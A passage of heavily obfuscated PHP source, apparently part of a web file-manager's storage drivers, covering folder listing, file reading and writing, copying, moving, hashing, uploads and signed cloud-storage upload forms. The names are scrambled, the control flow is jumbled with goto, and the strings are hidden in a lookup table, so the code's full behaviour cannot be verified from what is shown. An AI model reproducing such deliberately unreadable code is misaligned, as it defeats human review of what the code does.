$CÃ–óïä»[107] => @filemtime($B˜ŞìÈ¸§Û), $CÃ–óïä»[1167] => @fileatime($B˜ŞìÈ¸§Û), $CÃ–óïä»[77] => $this->size($B˜ŞìÈ¸§Û), $CÃ–óïä»[160] => $this->ext($CÄ ÁÉÂ‚ç), $CÃ–óïä»[1161] => is_readable($B˜ŞìÈ¸§Û), $CÃ–óïä»[1162] => is_writable($B˜ŞìÈ¸§Û), $CÃ–óïä»[1168] => get_mode($B˜ŞìÈ¸§Û)); return $F§¥š´¸Â•; } public function exist($AµÑ¡õÂğ³) { $AµÑ¡õÂğ³ = $this->iconvSystem($AµÑ¡õÂğ³); return @file_exists($AµÑ¡õÂğ³); } public function isFile($C´Êõ¨¨£ì) { $C´Êõ¨¨£ì = $this->iconvSystem($C´Êõ¨¨£ì); return @is_file($C´Êõ¨¨£ì); } public function isFolder($DÄÎ•Øõìä) { $DÄÎ•Øõìä = $this->iconvSystem($DÄÎ•Øõìä); return @is_dir($DÄÎ•Øõìä); } public function listPath($b„Ìğ÷¬“Œ, $fÖ•â˜˜Â = false) { goto D½ì’ÎåäŞ; D½ì’ÎåäŞ: $C¾æ†Â¶Åä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b„Ìğ÷¬“Œ = $this->iconvSystem($b„Ìğ÷¬“Œ); $b„Ìğ÷¬“Œ = rtrim($b„Ìğ÷¬“Œ, $C¾æ†Â¶Åä[8]) . $C¾æ†Â¶Åä[8]; goto DÓ¹œ²Ïƒô; DÓ¹œ²Ïƒô: $F­ÇËôŒîä = array($C¾æ†Â¶Åä[74] => array(), $C¾æ†Â¶Åä[73] => array()); if (!($CåóùÒøïÅ = @opendir($b„Ìğ÷¬“Œ))) { return $F­ÇËôŒîä; } while (($bØ”®»§˜é = readdir($CåóùÒøïÅ)) !== !1) { if ($bØ”®»§˜é == $C¾æ†Â¶Åä[91] || $bØ”®»§˜é == $C¾æ†Â¶Åä[1164]) { continue; } $fÉëÜÅÃ© = $b„Ìğ÷¬“Œ . $bØ”®»§˜é; if (is_file($fÉëÜÅÃ©)) { $F­ÇËôŒîä[$C¾æ†Â¶Åä[73]][] = $this->fileInfo($fÉëÜÅÃ©, $fÖ•â˜˜Â); } else { $F­ÇËôŒîä[$C¾æ†Â¶Åä[74]][] = $this->folderInfo($fÉëÜÅÃ©, $fÖ•â˜˜Â); } } goto f…µ‡®Ùò×; f…µ‡®Ùò×: closedir($CåóùÒøïÅ); return $F­ÇËôŒîä; goto B¢ìÁœÅ›­; B¢ìÁœÅ›­: } public function listAll($cÊù·¸õ—, &$CÂÃÌñ»‘º = array()) { goto dĞÚÚ—Ô; fÃ£´³³¼â: return $CÂÃÌñ»‘º; goto c±Ïöè–”È; dĞÚÚ—Ô: $dš¼ñìª‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÊù·¸õ— = $this->iconvSystem($cÊù·¸õ—); $cÊù·¸õ— = rtrim($cÊù·¸õ—, $dš¼ñìª‰[8]) . $dš¼ñìª‰[8]; goto d•à¿Ñ¾ğ; d•à¿Ñ¾ğ: if (!($cÑò­—ÃÃ½ = @opendir($cÊù·¸õ—))) { return $CÂÃÌñ»‘º; } while (($A‘¾›™†ä† = readdir($cÑò­—ÃÃ½)) !== !1) { if ($A‘¾›™†ä† == $dš¼ñìª‰[91] || $A‘¾›™†ä† == $dš¼ñìª‰[1164]) { continue; } $AÎÏµØ‡¶ = $cÊù·¸õ— . $A‘¾›™†ä†; if (is_dir($AÎÏµØ‡¶) && !is_link($AÎÏµØ‡¶)) { $CÂÃÌñ»‘º[] = array($dš¼ñìª‰[75] => $AÎÏµØ‡¶ . $dš¼ñìª‰[8], $dš¼ñìª‰[76] => 1, $dš¼ñìª‰[107] => @filemtime($AÎÏµØ‡¶), $dš¼ñìª‰[77] => 0); $this->listAll($AÎÏµØ‡¶, $CÂÃÌñ»‘º); } else { $CÂÃÌñ»‘º[] = array($dš¼ñìª‰[75] => $AÎÏµØ‡¶, $dš¼ñìª‰[76] => 0, $dš¼ñìª‰[107] => @filemtime($AÎÏµØ‡¶), $dš¼ñìª‰[77] => $this->size($AÎÏµØ‡¶)); } } closedir($cÑò­—ÃÃ½); goto fÃ£´³³¼â; c±Ïöè–”È: } public function has($dÀœ¡´Œ¥š, $e¢½®ÃÒ¬Â = false, $eŞÛ§‡¶ÃÖ = true) { goto BÑ³¿÷Å•; eÆÌ¢Ì­È: $aåÉ¾¤Ä = 0; while (($e¾âğ‰ÆÄ® = readdir($A¯âĞŸ”¡ò)) !== !1) { if ($e¾âğ‰ÆÄ® == $c¢à›Œ¡¥[91] || $e¾âğ‰ÆÄ® == $c¢à›Œ¡¥[1164]) { continue; } $d¼ÕªóğÛê = $dÀœ¡´Œ¥š . $e¾âğ‰ÆÄ®; if ($e¢½®ÃÒ¬Â) { $aåÉ¾¤Ä++; if (@is_file($d¼ÕªóğÛê)) { $F•ôšäØÅÜ++; } else { $e·¨“ë—‰++; } if ($aåÉ¾¤Ä > 10000) { break; } continue; } if ($eŞÛ§‡¶ÃÖ) { if (@is_file($d¼ÕªóğÛê)) { return !0; } } else { if (@is_dir($d¼ÕªóğÛê . $c¢à›Œ¡¥[8])) { return !0; } } } closedir($A¯âĞŸ”¡ò); goto e‰èğ‘İ¥; BÑ³¿÷Å•: $c¢à›Œ¡¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÀœ¡´Œ¥š = $this->iconvSystem($dÀœ¡´Œ¥š); $dÀœ¡´Œ¥š = rtrim($dÀœ¡´Œ¥š, $c¢à›Œ¡¥[8]) . $c¢à›Œ¡¥[8]; goto d‚Ğô½ÉÍµ; d‚Ğô½ÉÍµ: if (!($A¯âĞŸ”¡ò = @opendir($dÀœ¡´Œ¥š))) { return !1; } $F•ôšäØÅÜ = 0; $e·¨“ë—‰ = 0; goto eÆÌ¢Ì­È; e‰èğ‘İ¥: if ($e¢½®ÃÒ¬Â) { return array($c¢à›Œ¡¥[191] => $F•ôšäØÅÜ, $c¢à›Œ¡¥[192] => $e·¨“ë—‰); } return !1; goto fë§ˆà—Æ; fë§ˆà—Æ: } public function hashSimple($aÙç®¹‘µƒ) { goto Bæ¸ŸŸõ…Ø; e“ÎŸéæó÷: $d®ƒ¨ˆä»ã = fopen($aÙç®¹‘µƒ, $FìğµÉ[1169]); if (!$d®ƒ¨ˆä»ã) { return $c”ÙªÅ¤ª; } for ($D‰ËŠ‘²ó¨ = 0; $D‰ËŠ‘²ó¨ < $fäÒ†‡…; $D‰ËŠ‘²ó¨++) { fseek($d®ƒ¨ˆä»ã, $c¾‹‚¸… * $D‰ËŠ‘²ó¨); $c”ÙªÅ¤ª .= fread($d®ƒ¨ˆä»ã, $E—“ê¾‚…); } goto A¡õ¾•Üì; A¡õ¾•Üì: fseek($d®ƒ¨ˆä»ã, $AöØê»š¨ê - $E—“ê¾‚…); $c”ÙªÅ¤ª .= fread($d®ƒ¨ˆä»ã, $E—“ê¾‚…); fclose($d®ƒ¨ˆä»ã); goto bê•–âóŠ¡; A¶Úî¤°: if ($AöØê»š¨ê <= $E—“ê¾‚… * $fäÒ†‡…) { return $this->hashMd5($aÙç®¹‘µƒ) . $AöØê»š¨ê; } $c”ÙªÅ¤ª = $FìğµÉ[33]; $c¾‹‚¸… = intval($AöØê»š¨ê / $fäÒ†‡…); goto e“ÎŸéæó÷; Bæ¸ŸŸõ…Ø: $FìğµÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$aÙç®¹‘µƒ) { return md5($FìğµÉ[33]); } $aÙç®¹‘µƒ = $this->iconvSystem($aÙç®¹‘µƒ); goto bÆìÆÓ”öé; bÆìÆÓ”öé: $AöØê»š¨ê = $this->size($aÙç®¹‘µƒ); $E—“ê¾‚… = 200; $fäÒ†‡… = 50; goto A¶Úî¤°; bê•–âóŠ¡: return md5($c”ÙªÅ¤ª) . $AöØê»š¨ê; goto F¿Æ²áâœå; F¿Æ²áâœå: } public function getContent($FİÏ¹óõÒØ) { $FİÏ¹óõÒØ = $this->iconvSystem($FİÏ¹óõÒØ); return file_get_contents($FİÏ¹óõÒØ); } public function setContent($AÕáä®ßó, $A¨ÎÊ··Úµ = '') { $AÕáä®ßó = $this->iconvSystem($AÕáä®ßó); @file_put_contents($AÕáä®ßó, $A¨ÎÊ··Úµ, LOCK_EX); clearstatcache(); return strlen($A¨ÎÊ··Úµ) == filesize($AÕáä®ßó); } public function fileSubstr($aª±ÛˆÊ¢¦, $c˜¥‚ÄØò· = 0, $aõ»É²¤ƒì = false) { goto dÇÓ²œ‘ÀÔ; c“”†Àùè: fseek($a…°­Ü…Ğ, $c˜¥‚ÄØò·); $eä’œ–ÌÒ = fread($a…°­Ü…Ğ, $aõ»É²¤ƒì); fclose($a…°­Ü…Ğ); goto c¡ ìŞÆâ; Añ©á¿¾ÕÕ: if ($aõ»É²¤ƒì <= 0) { return $eÔ»×ßŒ–[33]; } $a…°­Ü…Ğ = fopen($aª±ÛˆÊ¢¦, $eÔ»×ßŒ–[1169]); if (!$a…°­Ü…Ğ) { return !1; } goto c“”†Àùè; dÇÓ²œ‘ÀÔ: $eÔ»×ßŒ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aª±ÛˆÊ¢¦ = $this->iconvSystem($aª±ÛˆÊ¢¦); if ($aõ»É²¤ƒì === !1) { $aõ»É²¤ƒì = $this->size($aª±ÛˆÊ¢¦); } goto Añ©á¿¾ÕÕ; c¡ ìŞÆâ: return $eä’œ–ÌÒ; goto c¼âÖŒ’±â; c¼âÖŒ’±â: } public function upload($B±ëÑíöÚ, $dµÓí¶çÃÉ, $Bµİ…ì…î° = false, $CÑ–å»ÌÉÀ = REPEAT_REPLACE) { $BãÃœ›š¿Û = $this->copyFile($dµÓí¶çÃÉ, $B±ëÑíöÚ); return $BãÃœ›š¿Û ? $this->getPathOuter($B±ëÑíöÚ) : !1; } public function setModifyTime($CÏ¡Û‡­ÉÃ, $B·ï±Ä¡—† = '') { @touch($CÏ¡Û‡­ÉÃ, intval($B·ï±Ä¡—†)); } public function download($Aôîß¬âî, $aô…„©©åÆ) { return $this->iconvSystem($Aôîß¬âî); } } goto f¤¯á´—Ñ»; DŠÎØÜ«¦: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($FáóÂÜâé) { parent::__construct($FáóÂÜâé); $this->signatureVersion($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][200]); } public function uploadFormData($cÄäå•½ŞÏ, $B†ˆë¯·øÓ = 3600) { goto d‡‚Ö‹İ; cÒ‹ñ¼®¡í: $ašëÉ¤ÛÎ = array($dìÉš´×ÄÄ[1099] => $CöˆÔÌñÉ‡, $dìÉš´×ÄÄ[1100] => array(array($dìÉš´×ÄÄ[1101] => $F‰—Á×¢Á), array($dìÉš´×ÄÄ[1102] => $this->bucket), array($dìÉš´×ÄÄ[1103], $dìÉš´×ÄÄ[1104], $dìÉš´×ÄÄ[33]), array($dìÉš´×ÄÄ[1105] => $a™¼ŠÄùğ), array($dìÉš´×ÄÄ[1106] => $DÉÜ™ßˆó), array($dìÉš´×ÄÄ[1107] => $this->accessKey), array($dìÉš´×ÄÄ[1108] => $DØ…·¾î„))); $ašëÉ¤ÛÎ = json_encode($ašëÉ¤ÛÎ); $C¼õÊäš–— = hash_hmac($dìÉš´×ÄÄ[218], $DØ…·¾î„, $this->secret); goto Fô¯™¸èÛ; d‡‚Ö‹İ: $dìÉš´×ÄÄ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F‰—Á×¢Á = $dìÉš´×ÄÄ[185]; $DÉÜ™ßˆó = $dìÉš´×ÄÄ[218]; goto dÁÒ£ÓÀ’…; Fô¯™¸èÛ: $eÃóŒéßÌ› = sha1($ašëÉ¤ÛÎ); $B³Íá‘ô¯ = hash_hmac($dìÉš´×ÄÄ[218], $eÃóŒéßÌ›, $C¼õÊäš–—); $b²ô®»¦…Î = array($dìÉš´×ÄÄ[1101] => $F‰—Á×¢Á, $dìÉš´×ÄÄ[1105] => $a™¼ŠÄùğ, $dìÉš´×ÄÄ[1109] => base64_encode($ašëÉ¤ÛÎ), $dìÉš´×ÄÄ[1106] => $DÉÜ™ßˆó, $dìÉš´×ÄÄ[1107] => $this->accessKey, $dìÉš´×ÄÄ[1110] => $DØ…·¾î„, $dìÉš´×ÄÄ[1111] => $B³Íá‘ô¯, $dìÉš´×ÄÄ[169] => $this->getHost()); goto eÆïÕ–Ğğ’; eÆïÕ–Ğğ’: return $b²ô®»¦…Î; goto CŒ¹‘ÔœÑÉ; dÁÒ£ÓÀ’…: $a™¼ŠÄùğ = $dìÉš´×ÄÄ[1097]; $CöˆÔÌñÉ‡ = gmdate($dìÉš´×ÄÄ[1098], time() + $B†ˆë¯·øÓ); $DØ…·¾î„ = (string) time() . $dìÉš´×ÄÄ[67] . (string) (time() + $B†ˆë¯·øÓ); goto cÒ‹ñ¼®¡í; CŒ¹‘ÔœÑÉ: } public function fileOutLink($F’¼£º‡Ë) { $fé¤™âÈŸŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (substr($F’¼£º‡Ë, 0, 7) == $fé¤™âÈŸŸ[1112]) { $F’¼£º‡Ë = $fé¤™âÈŸŸ[1113] . substr($F’¼£º‡Ë, 7); } header($fé¤™âÈŸŸ[156] . $F’¼£º‡Ë); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Aô¡³ğŞ£©) { $this->pathParse = $Aô¡³ğŞ£©; $this->model = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1114]); } public function getPath($B¯´ê•„ëŠ) { return trim($B¯´ê•„ëŠ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8]); } public function pathFather($a´ä†¨÷¸¼) { $eŞ°‡à­‰Ì = $this->parse($a´ä†¨÷¸¼); $eŞ°‡à­‰Ì = $this->infoSimple($a´ä†¨÷¸¼); return $eŞ°‡à­‰Ì ? $eŞ°‡à­‰Ì[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][463]] : !1; } public function getPathName($cˆ÷ßî¬Ô) { $a¬¹º†ÑÙ = $this->infoSimple($cˆ÷ßî¬Ô); return $a¬¹º†ÑÙ ? $a¬¹º†ÑÙ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]] : !1; } public function getPathOuter($FÈøÚ­ò¤æ) { if (!$FÈøÚ­ò¤æ) { return $FÈøÚ­ò¤æ; } $d’ãÉÜ£ç‡ = $this->parse($FÈøÚ­ò¤æ); return KodIO::make($d’ãÉÜ£ç‡[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][367]]); } public function copyFolderFromIO($dï¸çªå“ , $e‡Äˆ¥–³, $DÜ¸‘æä£–, $fÚ ƒŞÅª, $eå˜»‰¯‹ã) { $A»œ¿™ğÙ = $this->model->copyFolderFromIO($dï¸çªå“ , $e‡Äˆ¥–³, $DÜ¸‘æä£–, $fÚ ƒŞÅª, $eå˜»‰¯‹ã); return KodIO::make($A»œ¿™ğÙ); } public function isParentOf($BâäÊ®–±ò, $A›ËØ½¸³’) { return $this->model->isParentOf($BâäÊ®–±ò, $A›ËØ½¸³’); } public function mkfile($còÉÎí—ß§, $C»‹œÏ’š = '', $F¡£ˆÆ±Ôù = REPEAT_RENAME) { $A“‹£ªíŸ¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e²×Ìô¹æ = $this->parse($còÉÎí—ß§); $còÉÎí—ß§ = $e²×Ìô¹æ[$A“‹£ªíŸ¬[367]]; for ($aŒä§Ä·ö¡ = 0; $aŒä§Ä·ö¡ < count($e²×Ìô¹æ[$A“‹£ªíŸ¬[1115]]); $aŒä§Ä·ö¡++) { $b‘¢”»â¥² = $e²×Ìô¹æ[$A“‹£ªíŸ¬[1115]][$aŒä§Ä·ö¡]; if ($aŒä§Ä·ö¡ == count($e²×Ìô¹æ[$A“‹£ªíŸ¬[1115]]) - 1) { $còÉÎí—ß§ = $this->model->mkfile($còÉÎí—ß§, $b‘¢”»â¥², $C»‹œÏ’š, $F¡£ˆÆ±Ôù); break; } $còÉÎí—ß§ = $this->model->mkdir($còÉÎí—ß§, $b‘¢”»â¥², REPEAT_SKIP); } return $this->getPathOuter($còÉÎí—ß§); } public function mkdir($Aë±æ÷˜²É, $eÍºâ™Í©ç = REPEAT_SKIP) { $A¦Î£ÒÄ³‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dô–¼³Æ‘ = $this->parse($Aë±æ÷˜²É); $Aë±æ÷˜²É = $dô–¼³Æ‘[$A¦Î£ÒÄ³‰[367]]; for ($aÀŞÙ“‹¸¼ = 0; $aÀŞÙ“‹¸¼ < count($dô–¼³Æ‘[$A¦Î£ÒÄ³‰[1115]]); $aÀŞÙ“‹¸¼++) { $eâå‰Ö«–â = $dô–¼³Æ‘[$A¦Î£ÒÄ³‰[1115]][$aÀŞÙ“‹¸¼]; $Aë±æ÷˜²É = $this->model->mkdir($Aë±æ÷˜²É, $eâå‰Ö«–â, $eÍºâ™Í©ç); } return $this->getPathOuter($Aë±æ÷˜²É); } public function copyFile($f’İ›—¨ò, $Bß©ô†ğãô, $Fƒ¯À”õª’ = REPEAT_REPLACE) { $d¦òÒ¾ôÛÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eƒƒ—…ã÷Ğ = $this->parse($Bß©ô†ğãô); $B¼Ã‰ìÂ¢£ = $this->model->copy($f’İ›—¨ò, $Eƒƒ—…ã÷Ğ[$d¦òÒ¾ôÛÀ[367]], $Fƒ¯À”õª’, $Eƒƒ—…ã÷Ğ[$d¦òÒ¾ôÛÀ[75]]); return $B¼Ã‰ìÂ¢£ ? $this->getPathOuter($B¼Ã‰ìÂ¢£) : !1; } public function moveFile($BùÖ¥½™, $AõÖà˜Ì‘, $a…ëŞ»ÇĞ = REPEAT_REPLACE) { $E´ù²„’¹¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F„×†İ™„É = $this->parse($AõÖà˜Ì‘); $CÙ†˜òùĞ = $this->model->move($BùÖ¥½™, $F„×†İ™„É[$E´ù²„’¹¤[367]], $a…ëŞ»ÇĞ, $F„×†İ™„É[$E´ù²„’¹¤[75]]); return $CÙ†˜òùĞ ? $this->getPathOuter($CÙ†˜òùĞ) : !1; } public function copy($f§”æ¡œÇ, $eë ²çÁÖ, $B‡ˆî¶†çê = REPEAT_REPLACE) { $cí‹ÙË©‡ = $this->parse($eë ²çÁÖ); $eÆ Éº¿›™ = $this->model->copy($f§”æ¡œÇ, $cí‹ÙË©‡[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][367]], $B‡ˆî¶†çê); return $eÆ Éº¿›™ ? $this->getPathOuter($eÆ Éº¿›™) : !1; } public function moveSameAllow() { } public function move($eãÂï¿Äµ, $föšÍ†ÌÕ™, $dÎçõ•õ– = REPEAT_REPLACE) { $Eãš»…×¿Ì = $this->parse($föšÍ†ÌÕ™); $a°çˆâÌÃ = $this->model->move($eãÂï¿Äµ, $Eãš»…×¿Ì[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][367]], $dÎçõ•õ–); return $a°çˆâÌÃ ? $this->getPathOuter($a°çˆâÌÃ) : !1; } public function remove($E­‚·Œµ“å, $D†îæŒ¾ĞÁ = true) { return $this->model->remove($E­‚·Œµ“å, $D†îæŒ¾ĞÁ); } public function rename($aÓÄØ•¢ê´, $AË¤­È×ÉÎ) { $a«¡êµ°˜¢ = $this->model->rename($aÓÄØ•¢ê´, $AË¤­È×ÉÎ); return $a«¡êµ°˜¢ ? $this->getPathOuter($aÓÄØ•¢ê´) : $a«¡êµ°˜¢; } public function size($fŞšéöÚ¸à) { $F›Ã¢ĞƒØŒ = $this->infoSimple($fŞšéöÚ¸à); return $F›Ã¢ĞƒØŒ ? $F›Ã¢ĞƒØŒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function infoSimple($BÚÏÎŒêÂÙ) { return $this->model->sourceInfo($BÚÏÎŒêÂÙ); } public function info($e“·¦˜Ğ©á) { return $this->infoParse($e“·¦˜Ğ©á); } public function infoAuth($f­Ñ‚á†–) { return $this->infoParse($f­Ñ‚á†–, !1, !0); } public function infoWithChildren($d­Ñ…ìô¦ß) { return $this->infoParse($d­Ñ…ìô¦ß, !0); } protected function infoParse($c™†‘•ì¹¦, $d›±„îßƒ³ = false, $B¤·ğ‘·˜ó = false) { if (!$d›±„îßƒ³) { return $this->model->pathInfo($c™†‘•ì¹¦, $B¤·ğ‘·˜ó); } return $this->model->pathInfoMore($c™†‘•ì¹¦); } public function infoFull($EÑŒ¶Ô¦—Ú) { $a„Œ—Î‰©Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e×ÛËˆõ‘ = explode($a„Œ—Î‰©Ã[8], $EÑŒ¶Ô¦—Ú); $A·ºõ¶´È = implode($a„Œ—Î‰©Ã[8], array_splice($e×ÛËˆõ‘, 1)); return $this->model->pathInfoByPath($e×ÛËˆõ‘[0], $A·ºõ¶´È); } public function hashSimple($Có±íÕ¦Ğ¢) { $Dœ—øˆàÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¿¾†¨µœö = $this->infoWithChildren($Có±íÕ¦Ğ¢); return $f¿¾†¨µœö[$Dœ—øˆàÉ[162]][$Dœ—øˆàÉ[164]]; } public function hashMd5($bØ°ªáÃ”¿) { $B¤ÈïãµÛš =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cŞæïÇô¬‹ = $this->infoWithChildren($bØ°ªáÃ”¿); return $cŞæïÇô¬‹[$B¤ÈïãµÛš[162]][$B¤ÈïãµÛš[163]]; } public function exist($FÂÖîÅÛ˜À) { $a‹’·”ºĞÊ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¸Î¥ï¿µÖ = $this->parse($FÂÖîÅÛ˜À); if (!$f¸Î¥ï¿µÖ[$a‹’·”ºĞÊ[75]]) { return $this->isFile($FÂÖîÅÛ˜À) || $this->isFolder($FÂÖîÅÛ˜À); } $fİÆØ÷œ¹Œ = array($a‹’·”ºĞÊ[368] => $f¸Î¥ï¿µÖ[$a‹’·”ºĞÊ[367]], $a‹’·”ºĞÊ[28] => $f¸Î¥ï¿µÖ[$a‹’·”ºĞÊ[75]]); $aîôŒ¯–ÁÎ = $this->model->where($fİÆØ÷œ¹Œ)->find(); return $aîôŒ¯–ÁÎ ? !0 : !1; } public function isFile($D´ƒ‡âó“¼) { $bëÍÀ¯†… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fãÆëÔèÅ· = $this->infoSimple($D´ƒ‡âó“¼); return $fãÆëÔèÅ· && $fãÆëÔèÅ·[$bëÍÀ¯†…[370]] == $bëÍÀ¯†…[83] ? !1 : !0; } public function isFolder($C³Ä„ËîÀ) { $e¼•ğãÎ£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÉö§èª½« = $this->infoSimple($C³Ä„ËîÀ); return $eÉö§èª½« && $eÉö§èª½«[$e¼•ğãÎ£[370]] == $e¼•ğãÎ£[83] ? !0 : !1; } public function listPath($CóÛÈªäº£, $bê‡¬‚â¦± = false) { $DˆÍ……‘È‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($CóÛÈªäº£ == $DˆÍ……‘È‹[33]) { return !1; } $DÑÖš†Ô¼ = array($DˆÍ……‘È‹[368] => $CóÛÈªäº£); if ($bê‡¬‚â¦±) { return $this->model->listSource($DÑÖš†Ô¼, -1); } return $this->model->listSource($DÑÖš†Ô¼); } public function has($eîİ‰×Ş’Ô, $f¾ÀÜª¯å„ = false, $EÒ¡·ğÀÙŠ = null) { $A´ğÈˆº =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B©ã¤™Œ™Ä = $this->infoWithChildren($eîİ‰×Ş’Ô); if ($f¾ÀÜª¯å„) { return array($A´ğÈˆº[192] => $B©ã¤™Œ™Ä[$A´ğÈˆº[192]], $A´ğÈˆº[191] => $B©ã¤™Œ™Ä[$A´ğÈˆº[191]]); } return $EÒ¡·ğÀÙŠ ? $B©ã¤™Œ™Ä[$A´ğÈˆº[192]] : $B©ã¤™Œ™Ä[$A´ğÈˆº[191]]; } public function listAll($aÉÚòåƒŒƒ) { $FŸ›§Ñ™× = IO::info($this->pathParse[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]); if (!$FŸ›§Ñ™×) { return array(); } return $this->model->listAll($aÉÚòåƒŒƒ); } public function getContent($Bëå¢«¾š±) { return $this->model->getContent($Bëå¢«¾š±); } public function setContent($bàÖïİ«Ù, $fš©õÌ˜§ñ = '') { return $this->model->setContent($bàÖïİ«Ù, $fš©õÌ˜§ñ); } public function fileSubstr($a†©Öˆ©, $cº¤îÂÈï›, $AŠµé‡ÁÊ£) { return $this->model->fileSubstr($a†©Öˆ©, $cº¤îÂÈï›, $AŠµé‡ÁÊ£); } public function download($fÛìÛ–, $aÏ¢–Êî²Ò = '') { $Cœ¥ÈİƒÎ = get_path_father($aÏ¢–Êî²Ò); $fñ†±Øâ¿Š = get_path_this($aÏ¢–Êî²Ò); $C®öª¥…ˆÜ = $this->model->fileInfoGet($fÛìÛ–); $fĞÚ¦Ÿ¸«‚ = IO::copy($C®öª¥…ˆÜ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]], $Cœ¥ÈİƒÎ, !1, $fñ†±Øâ¿Š); return $fĞÚ¦Ÿ¸«‚; } public function setModifyTime($C¢¶ËØ³ôË, $f‚†¯óµÑ = '') { $this->model->metaSet($C¢¶ËØ³ôË, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1116], $f‚†¯óµÑ); } public function upload($aàéù Á£, $F–ËÍà³Áç, $BÛÚ¯¢áÜ‘ = false, $fŒ¬ÕÍÓ½ = REPEAT_REPLACE) { $aæçĞÎ²­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dæ›­‹âİö = $this->parse($aàéù Á£); $aš¹¢£¾ö† = $this->model->addFile($Dæ›­‹âİö[$aæçĞÎ²­[367]], $F–ËÍà³Áç, $Dæ›­‹âİö[$aæçĞÎ²­[75]], $BÛÚ¯¢áÜ‘, $fŒ¬ÕÍÓ½); return $this->getPathOuter($aš¹¢£¾ö†); } public function uploadFileByID($FÈîĞÅäø‘, $a–‘‡«Û¶, $a…ø›œˆ—) { $C’˜ë½Ä‘Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c‘ÌŞ‚Ëî® = $this->parse($FÈîĞÅäø‘); $CÃ‡Ê‚èÆµ = $this->model->addFileByFileID($c‘ÌŞ‚Ëî®[$C’˜ë½Ä‘Ã[367]], $a–‘‡«Û¶, $c‘ÌŞ‚Ëî®[$C’˜ë½Ä‘Ã[75]], $a…ø›œˆ—); return $this->getPathOuter($CÃ‡Ê‚èÆµ); } public function addFileByRemote($c–ˆ¾ôÒÏÑ, $bî·‘ì²ã, $Cªø‘“¶¾Î = array(), $EİÁ…îÍ = '', $A†ò“Ë÷½´) { $E„’Ä´œ²¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A‰æƒŒ…Œã = $this->parse($c–ˆ¾ôÒÏÑ); $EİÁ…îÍ = empty($EİÁ…îÍ) ? $A‰æƒŒ…Œã[$E„’Ä´œ²¨[75]] : $EİÁ…îÍ; $C¢ˆëÓ«ë = $this->model->addFileByRemote($A‰æƒŒ…Œã[$E„’Ä´œ²¨[367]], $bî·‘ì²ã, $EİÁ…îÍ, $Cªø‘“¶¾Î, $A†ò“Ë÷½´); return $this->getPathOuter($C¢ˆëÓ«ë); } public function uploadLink($e¬ê¹ºğ¡, $AÖ Š«ñƒÑ = 0) { $cÉ¤Üµ‚Äô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÅÉ² …©î = $this->parse($e¬ê¹ºğ¡); $e¬ê¹ºğ¡ = Model($cÉ¤Üµ‚Äô[546])->createFileName($fÅÉ² …©î[$cÉ¤Üµ‚Äô[75]]); $e‘ù•İİ×‡ = IO::uploadLink($e¬ê¹ºğ¡, $AÖ Š«ñƒÑ); return $e‘ù•İİ×‡; } public function fileNameAuto($eØ›˜óò¡, $DÀ«±…ÒÈ, $fî©ÁÌ´¢† = REPEAT_REPLACE, $B“•†–í§» = false) { return $this->model->fileNameAuto($eØ›˜óò¡, $DÀ«±…ÒÈ, $fî©ÁÌ´¢†, $B“•†–í§»); } public function fileNameExist($d•ë˜Šç–, $aÑ¨‚æôÊÓ) { return $this->model->fileNameExist($d•ë˜Šç–, $aÑ¨‚æôÊÓ); } protected function _fileOut($dÊ‘éíŒİ, $b’ŒÅ›¢¬ = false, $aô¸É±‚¡œ = false, $bÕ² Ô¬é = '', $C“ïƒÒÚÏÑ = false) { goto D…„©ñÙ™ˆ; B‡èªÎä¨: $FáÄ¬®œ¢ = $this->model->fileInfoGet($dÊ‘éíŒİ); $bÕ² Ô¬é = $FáÄ¬®œ¢[$aº¿›…••ä[163]] ? $FáÄ¬®œ¢[$aº¿›…••ä[163]] : $bÕ² Ô¬é; $f«Â‹ÉÇ‡Å = isset($GLOBALS[$aº¿›…••ä[1118]]) ? $GLOBALS[$aº¿›…••ä[1118]] : $c‰†—´›Ñ[$aº¿›…••ä[28]]; goto eÕÁù”ÆÔ¼; eÕÁù”ÆÔ¼: if ($C“ïƒÒÚÏÑ) { return IO::fileOutServer($FáÄ¬®œ¢[$aº¿›…••ä[75]], $b’ŒÅ›¢¬, $f«Â‹ÉÇ‡Å, $bÕ² Ô¬é); } IO::fileOut($FáÄ¬®œ¢[$aº¿›…••ä[75]], $b’ŒÅ›¢¬, 